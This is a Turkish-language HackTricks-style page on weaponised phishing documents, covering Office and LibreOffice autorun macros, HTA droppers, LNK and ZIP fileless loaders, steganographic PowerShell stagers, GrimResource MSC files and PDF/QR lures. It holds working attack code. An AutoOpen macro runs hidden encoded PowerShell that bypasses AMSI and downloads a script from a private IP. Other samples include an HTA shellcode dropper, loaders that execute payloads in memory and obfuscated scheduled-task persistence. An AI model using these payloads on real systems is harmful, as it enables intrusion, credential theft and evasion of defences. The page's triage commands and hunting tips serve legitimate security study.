# Phishing Dosyaları ve Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısının tanımlanması şeklinde gerçekleştirilir. Veri yapısı tanımlanırken herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Genellikle macro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve yine de macro çalıştırma özelliklerini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarımı gereği macro desteklemez; ancak RTF olarak yeniden adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenir ve macro çalıştırabilir.\
Aynı dahili bileşenler ve mekanizmalar, Microsoft Office Suite'in tüm yazılımları için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programlarının hangi uzantıları çalıştıracağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX dosyaları, makro içeren uzak bir şablona (File –Options –Add-ins –Manage: Templates –Go) başvurarak makroları da “çalıştırabilir”.

### Harici Görsel Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture ve **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Harici Görsel Yükleme: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Bir belge oluşturmak yerine alınan bir belgeyi analiz etmek için bkz. [VBA makro analizi: anlamsız kod ve UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Makro Backdoor'u

Belgeden rastgele kod çalıştırmak için makrolar kullanılabilir.

#### Otomatik yükleme işlevleri

Ne kadar yaygın kullanılırlarsa AV tarafından tespit edilme olasılıkları o kadar artar.

- AutoOpen()
- Document_Open()

#### Makro kodu örnekleri

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadata'yı manuel olarak kaldırma

Document Inspector'ı açmak için **File > Info > Inspect Document > Inspect Document** yolunu izleyin. **Inspect**'e, ardından **Document Properties and Personal Information**'ın yanındaki **Remove All**'a tıklayın.

#### Doc uzantısı

İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve biçimi **`.docx`**'ten Word 97-2003 **`.doc`** biçimine değiştirin.\
Bunu yapın; çünkü **`.docx` içinde macro'ları kaydedemezsiniz** ve macro'ları etkinleştiren **`.docm`** uzantısının **damgalanması** söz konusudur (ör. küçük resim simgesinde kocaman bir `!` bulunur ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.

#### Malicious Macro Generator'ları

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT otomatik çalıştırma macro'ları (Basic)

LibreOffice Writer belgelerine Basic macro'ları eklenebilir ve macro, **Open Document** etkinliğine bağlanarak dosya açıldığında otomatik olarak çalıştırılabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyle görünür:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Not: Dizgedeki çift tırnaklara (`""`) dikkat edin: LibreOffice Basic, gerçek tırnak işaretlerini kaçırmak için bunları kullanır. Bu nedenle `...==""")` ile biten payload’larda hem iç komut hem de Shell argümanı dengeli kalır.

Teslimat ipuçları:

- Dosyayı `.odt` olarak kaydedin ve açıldığında hemen çalışması için makroyu belge olayına bağlayın.
- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` işareti, dosya adı metninin değil dosya baytlarının ek olarak gönderilmesi için gereklidir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını kötüye kullanırken kritik önem taşır.

## HTA Dosyaları

HTA, **HTML ile betik dillerini (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelindeki kısıtlamalara tabi olmadan, "tamamen güvenilen" bir uygulama olarak çalışır.

HTA, genellikle **Internet Explorer ile birlikte yüklenen** **`mshta.exe`** kullanılarak çalıştırılır; bu nedenle **`mshta`, IE'ye bağımlıdır**. Dolayısıyla IE kaldırılmışsa HTA'lar çalıştırılamaz.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML e-postada sahte ek kartları

Bir HTML e-posta, gerçek bir ek içermek yerine sağlayıcının yerel ek önizleme kartını taklit edebilir. Talos, dört Base64 kodlu satır içi PNG MIME parçasından yeniden oluşturulmuş bir Gmail kartı gözlemledi. Görselin tamamı tek bir anchor içine yerleştirilmişti ve `?m=<target-id>` içindeki alıcı değeri, alıcı başına izlemeyi mümkün kılıyordu. Bağlantı `http://` veya `https://` yerine `//` ile başlıyordu; tarayıcılar bu protokole göreli biçimi çözümler, ancak yalnızca tam nitelikli URL'lerle eşleşen URL çıkarıcıları bunu gözden kaçırabilir.<sup>[[11]](#references)</sup>

Analiz sırasında, görüntülenen ek listesine güvenmek yerine ham MIME'ı inceleyin. Satır içi görsel parçalarının görsel kartı nasıl oluşturduğunu yeniden kurun, kartı çevreleyen anchor'ı belirleyin ve URL'leri çıkarmadan önce protokole göreli `href` değerlerini normalize edin.<sup>[[11]](#references)</sup>

Zarf/başlık göndereni sahteciliği ve DMARC hizalama testi için bkz. [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## NTLM Kimlik Doğrulamasını Zorlama

NTLM kimlik doğrulamasını **"uzaktan" zorlamanın** birkaç yolu vardır. Örneğin, kullanıcının erişeceği e-postalara veya HTML'ye **görünmez görseller** ekleyebilirsiniz (HTTP MitM yoluyla bile?). Ya da kurbanı, yalnızca **klasörü açarak** **kimlik doğrulamayı** **tetikleyecek** dosya **adreslerine** yönlendirebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya kimlik doğrulamayı çalmakla kalmayıp **NTLM relay saldırıları da gerçekleştirebileceğinizi** unutmayın:

- [**NTLM Relay saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (sertifikalara NTLM relay)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK ile `ftp.exe` yerel komut hazırlama

Bir kısayol, görsel uzantısıyla gizlenmiş bir metin komut dosyasını kullanarak `ftp.exe -s:icon.ico` başlatabilir.<sup>[[12]](#references)</sup> `-s:` seçeneği yerel FTP komutlarını okur; Windows 8 ve sonraki sürümlerde bu dosyanın UTF-8 kodlu olması gerekir.<sup>[[13]](#references)</sup> `!` ile başlayan bir satır, komutu FTP sunucusuna göndermeden `cmd /c` aracılığıyla yerel bir komut çalıştırır. Bu yerel çalıştırma yolu için FTP bağlantısı gerekmez.<sup>[[14]](#references)</sup> Bildirilen zincirde FTP betiği ikinci bir komut dosyasına ulaşıyordu. `!` satırının tamamı önemlidir: yalnızca `!more res.ico` dosyayı görüntülerken `cmd`'ye aktarılan bir pipe, dosyanın içeriğini çalıştırır.<sup>[[12]](#references)[[14]](#references)</sup>

Aynı zincirde, her güncelleme için yeni bir yürütülebilir dosya yüklemek yerine yazılabilir bir komut dosyasını yeniden okuyan yinelenen bir görev kullanıldı. Görev eylemi `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd` şeklindeydi; dosyada çalıştırıldığında talimatları alan bir komut bulunuyordu. İlgili bir varyantta, zamanlanmış çalıştırmadan önce yeni bir komut dosyası indiriliyordu. Görev çalıştığında dosya mevcut ve okunabilir olmalıdır; `conhost`, görevi yapılandırılmış kullanıcı belirtecinin ötesinde yetkilerle çalıştırmaz.<sup>[[12]](#references)</sup> Görev mekanizmaları için bkz. [zamanlanmış görev yürütme](../../windows-hardening/lateral-movement/atexec.md).

## Gizli MSI ve yem belge içeren VHDX kısayolu

Bağlanmış bir VHDX, aynı birimdeki bir MSI ve yem elektronik tablosunu gizlerken görünür bir LNK gösterebilir. Bildirilen zincirde LNK, `cmd.exe /c Visa_Details.msi & Attachment-2.xls` komutunu kullanıyordu. `&` ayıracı, yükleyici komutu başarısız olsa bile yem belgeyi açar; belgenin açılması, yüklemenin başarıyla tamamlandığının kanıtı değildir. Bu, [MSI özel eylem yürütme](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md) yönteminin bir dağıtım çeşididir; tek başına MSI yetki yükseltmesi değildir.<sup>[[12]](#references)</sup>

Bu MSI için `CustomAction.Type` **194**, `Binary` tablosunda saklanan bir EXE'yi (**2**), dönüş kodunu yok sayma (**64**) ve asenkron (**128**) bayraklarıyla birleştirir. **64 + 128** birleşimi, Windows Installer'ın EXE'nin tamamlanmasını beklememesi anlamına gelir; yalnızca 128 bayrağı kullanılsaydı sıralamanın sonunda beklerdi.<sup>[[15]](#references)[[16]](#references)</sup> Yürütmeyi gömülü EXE'ye bağlamadan önce eylemin `Source` değerini `Binary` tablosuyla ve eylemin `InstallExecuteSequence` içindeki konumuyla karşılaştırın.<sup>[[12]](#references)[[15]](#references)</sup> [WebDAV UNC yolu uzak bir MSI dağıtabilir](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), ancak bu farklı bir giriş noktasıdır.

## LNK Loader'ları + ZIP içine gömülü Payload'lar (fileless zincir)

Etkili kampanyalar, iki meşru yem belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP dağıtır. Buradaki yöntem, asıl PowerShell loader'ının benzersiz bir işaretçiden sonraki ZIP ham baytlarında saklanması ve .lnk'nin bu içeriği çıkarıp tamamen bellekte çalıştırmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner'ının tipik akışı:

1) Özgün ZIP'i yaygın konumlarda bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.
2) ZIP baytlarını okuyun ve sabit kodlanmış bir işaretçi (ör. xFIQCV) bulun. İşaretçiden sonraki her şey gömülü PowerShell payload'ıdır.
3) ZIP'i %ProgramData% konumuna kopyalayın, oraya çıkarın ve meşru görünmek için yem .docx dosyasını açın.
4) Geçerli süreç için AMSI'yi atlatın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki aşamanın gizlemesini kaldırın (ör. tüm # karakterlerini silin) ve bellekte çalıştırın.

Gömülü aşamayı çıkarıp çalıştırmak için örnek PowerShell iskeleti:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notlar
- Delivery çoğu zaman güvenilir PaaS alt alan adlarını (örn. *.herokuapp.com) kötüye kullanır ve payload'ları koşullara bağlayabilir (IP/UA'ya göre zararsız ZIP'ler sunar).
- Sonraki aşama, genellikle base64/XOR shellcode'u çözer ve disk üzerindeki izleri en aza indirmek için bunu Reflection.Emit + VirtualAlloc ile çalıştırır.

Aynı zincirde kullanılan persistence
- Microsoft Web Browser control'ünün COM TypeLib hijacking yöntemiyle ele geçirilmesi; böylece IE/Explorer veya bu denetimi gömen herhangi bir uygulama payload'u otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntılar ve kullanıma hazır komutlar için:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOC'ler
- Arşiv verisinin sonuna eklenmiş ASCII işaretçi dizesi (örn. xFIQCV) içeren ZIP dosyaları.
- ZIP dosyasını bulmak için üst/ kullanıcı klasörlerini tarayan ve bir yem belge açan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed üzerinden AMSI kurcalaması.
- Güvenilir PaaS alan adlarında barındırılan bağlantılarla sona eren, uzun süredir devam eden iş yazışmaları.

## LNK ile önce decoy gösterme → scheduled-task persistence → güvenilir CPL side-loading

Tekrarlanan bir başka örüntü, arka planda gerçek zinciri hazırlarken zararsız bir yem belgeyi hemen açan, **belge gibi görünen bir `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>

Gözlemlenen iş akışı:
1. Kısayol **PDF gibi görünür** ve gizlenmiş bir PowerShell downloader'ı başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, belirgin token'ları parçalara ayırır (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`); böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit tespitler komutu kaçırır.
3. Stager önce **yem belgeyi indirir**, kurbanın açması için belgeyi görüntüler ve ardından arka planda zararlı dosyaları yeniden oluşturur.
4. Payload'lar **anlamsız uzantılarla** yazılabilir ve ardından dolgu karakterleri kaldırılarak yeniden adlandırılabilir; böylece bariz `.exe` / `.cpl` izlerinin ortaya çıkması geciktirilir.
5. Persistence, kullanıcı tarafından yazılabilir bir konumdaki güvenilir bir host binary'yi başlatan **dakika bazlı bir scheduled task** ile sağlanır.

Bu örüntüden çıkarılabilecek temel hunting ipuçları:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Tanımaya değer bir staging düzeni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` veya `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden gizlidir

Rapid7 vaka incelemesinde, zamanlanmış görev **`Fondue.exe`** dosyasını tekrar tekrar `C:\Users\Public\` konumundan başlatıyordu. **`APPWIZ.cpl`** dosyası bunun yanına yerleştirilip **`RunFODW`** dışa aktarıldığı için, güvenilir Microsoft binary’si meşru sistem kopyası yerine saldırganın CPL dosyasını side-load ediyordu.

CPL daha sonra:
- `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob’unu okur
- **Windows CNG / `bcrypt.dll`** aracılığıyla şifresini çözer
- Çalıştırılabilir bellek ayırır ve çözülen shellcode’u buraya kopyalar
- Shellcode pointer’ını **`EnumUILanguagesW`** için callback olarak ileterek onu dolaylı biçimde çalıştırır

Son adım ayrıca araştırılmaya değer: malware, yürütmeyi devretmek için çoğu zaman doğrudan `((void(*)())buf)()` atlamasından kaçınır ve bunun yerine **callback alan meşru bir WinAPI** işlevini kötüye kullanır.

Bu kampanyadaki çözülen payload, son PE’yi tamamen belleğe eşleyen ve yürütmeyi devretmeden önce mevcut process içinde **AMSI/WLDP/ETW**’yi patch’leyen **Donut** shellcode’uydu. Side-loading ve bellekte kalan post-processing hakkında daha ayrıntılı notlar için:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik inceleme ipuçları:
- Ardından görünür bir decoy belgesi açan `.lnk` dosyasının `powershell.exe` veya `conhost.exe` başlatması.
- **`C:\Users\Public\`** konumuna kısa süreli indirmeler yapılmasının ardından dosyaların anlamsız uzantılardan hemen yeniden adlandırılması.
- `GoogleErrorReport` gibi sıradan adlara sahip zamanlanmış görevlerin **kullanıcının yazabildiği dizinlerden** çalıştırılması.
- Güvenilir binary’lerin aynı sistem dışı dizindeki **`.cpl` / `.dll`** dosyalarını yüklemesi.
- **`C:\Windows\Tasks\`** altına Base64 metin blob’ları yazılması ve bunların ardından side-load edilmiş modül tarafından okunması.

## Görüntülerde steganografiyle sınırlandırılmış payload’lar (PowerShell stager)

Güncel loader zincirleri, Base64 PowerShell stager’ını çözüp çalıştıran, obfuscate edilmiş JavaScript/VBS gönderir. Bu stager, düz metin olarak benzersiz başlangıç/bitiş işaretleyicileri arasına gizlenmiş Base64 kodlu bir .NET DLL içeren görüntüyü (çoğunlukla GIF) indirir. Script bu ayraçları arar (gerçek saldırılarda görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, byte’lara Base64 decode eder, assembly’yi belleğe yükler ve bilinen bir giriş metodunu C2 URL’siyle çağırır.<sup>[[5]](#references)</sup>

İş Akışı
- Aşama 1: Arşivlenmiş JS/VBS dropper → gömülü Base64’ü çözer → `-nop -w hidden -ep bypass` parametreleriyle PowerShell stager’ını başlatır.
- Aşama 2: PowerShell stager’ı → görüntüyü indirir, işaretleyicilerle sınırlandırılmış Base64’ü çıkarır, .NET DLL’ini belleğe yükler ve metodunu (ör. VAI) C2 URL’si ile seçenekleri ileterek çağırır.
- Aşama 3: Loader son payload’ı alır ve genellikle process hollowing yoluyla güvenilir bir binary’ye (yaygın olarak MSBuild.exe) inject eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve güvenilir yardımcı program proxy execution hakkında daha fazla bilgi için:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir görüntüden DLL’i çıkarıp bellekteki .NET metodunu çağırmaya yönelik PowerShell örneği:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notlar
- Bu, ATT&CK T1027.003'tür (steganografi/işaretçi gizleme).<sup>[[6]](#references)</sup> İşaretçiler kampanyalara göre değişir.
- AMSI/ETW bypass ve string obfuscation, assembly yüklenmeden önce yaygın olarak uygulanır.
- Tehdit avı: İndirilen görselleri bilinen ayraçlar için tarayın; görsellere erişip hemen Base64 blob'larını decode eden PowerShell'i belirleyin.

Ayrıca stego araçlarına ve carving tekniklerine bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Yinelenen bir ilk aşama, bir arşiv içinde gönderilen, küçük ve yoğun şekilde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini decode etmek ve HTTPS üzerinden sonraki aşamayı başlatmak için PowerShell'i `-nop -w hidden -ep bypass` ile çalıştırmaktır.<sup>[[5]](#references)</sup>

İskelet mantık (soyut):
- Kendi dosya içeriğini oku
- Gereksiz string'ler arasındaki Base64 blob'unu bul
- ASCII PowerShell'e decode et
- `wscript.exe`/`cscript.exe` kullanarak `powershell.exe` çalıştır

Tehdit avı ipuçları
- Komut satırında `-enc`/`FromBase64String` içeren `powershell.exe` süreçlerini başlatan, arşivlenmiş JS/VBS ekleri.
- Kullanıcı temp dizinlerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe`.

## MSC belgeleri yürütme kapsayıcıları olarak (GrimResource)

Microsoft Management Console dosyaları (`.msc`), normalde `mmc.exe` tarafından açılan XML konsol tanımlarıdır. **GrimResource**, eski bir XSS primitive'i içeren `apds.dll` kaynağına yönelik bir `StringTable` referansını silahlandırır; böylece kullanıcının hazırlanmış konsolu açması, JavaScript'in `mmc.exe` içinde çalışmasına neden olur. Gözlemlenen örneklerde, olağan Office-macro yolunu kullanmadan bir .NET payload'ı başlatmak için `transformNode` tabanlı obfuscation, **DotNetToJScript** ile birleştirilmiştir.<sup>[[9]](#references)</sup>

Statik ilk inceleme için güvenilmeyen bir MSC'yi metin olarak ele alın ve üzerine **çift tıklamayın**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Yüksek sinyalli runtime pivotları arasında `mmc.exe`’nin CLR veya script bileşenlerini yüklemesi, ağ bağlantıları kurması ya da `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` veya beklenmeyen bir executable başlatması yer alır. Format meşru olduğundan, tespitler her MSC’yi engellemek yerine **kaynak + şüpheli XML/script içeriği + `mmc.exe` davranışı** ilişkisini kurmalıdır.<sup>[[9]](#references)</sup>

## PDF/QR yönlendiricileri ve payload gating

Bir PDF’nin işe yaraması için exploit içermesi gerekmez. Güncel kampanyalarda zararsız görünen bir belgeye **QR code veya sıradan bir bağlantı** yerleştirilir, tarayıcı oturumu e-posta kontrollerinin dışına yönlendirilir ve hedef, alıcının adresine göre kişiselleştirilir. Microsoft, QR URL’leri alıcıya özel olan ve RaccoonO365 kimlik bilgisi toplama altyapısına yönlendiren 2025 tarihli PDF’leri belgeledi; paralel bir zincirde ise IP/ortam gating kullanılarak seçili ziyaretçilere JavaScript/MSI yolu, tarayıcılara veya izin verilmeyen istemcilere ise zararsız bir PDF sunuldu.<sup>[[10]](#references)</sup>

Hem PDF eylemlerini hem de oluşturulan QR code’ları triage edin. Bir QR, çıkarılabilir görüntü olarak saklanmak yerine vektör olarak çizilmiş olabilir; bu nedenle gömülü görüntüleri çıkarmanın yanı sıra her sayfayı rasterleştirin:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Yalıtılmış bir analiz sisteminden kimlik doğrulaması yapmadan çözülmüş hedefleri ve yönlendirmeleri inceleyin. Araştırmada işe yarayan özellikler arasında gövdesi neredeyse boş e-postalarla gönderilen, yalnızca QR kodu içeren PDF’ler; sorgu parametresine gömülü alıcı e-posta adresi; saygın barındırma hizmetleri üzerinden yapılan birden fazla yönlendirme ve IP’ye, coğrafi konuma, çerezlere, yönlendiren sayfaya veya user agent’a göre döndürülen farklı içerikler bulunur. Tek bir sandbox isteği yalnızca yem içeriği alabileceğinden, istekleri kontrollü profillerle karşılaştırın.<sup>[[10]](#references)</sup>

## NTLM hash'lerini çalmak için Windows dosyaları

**NTLM kimlik bilgilerini çalınabilecek yerler** hakkındaki sayfaya bakın:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: ABD şirketlerini hedef alan gelişmiş bir phishing saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Çin temalı bir loader zinciri üzerinden Dropping Elephant’ın taktiklerini izleme](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Yeni COM persistence tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader çeşitli infostealer'lar yayıyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Güvenilir geliştirici yardımcı programları proxy execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: İlk erişim ve kaçınma için Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Tehdit aktörleri vergi sezonunu kullanarak vergi temalı phishing kampanyaları yürütüyor](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 teslimat zinciri ve Antino backdoor'u](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER, PapRAT ile cephaneliğini genişletiyor](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - ftp komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Custom Action Type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
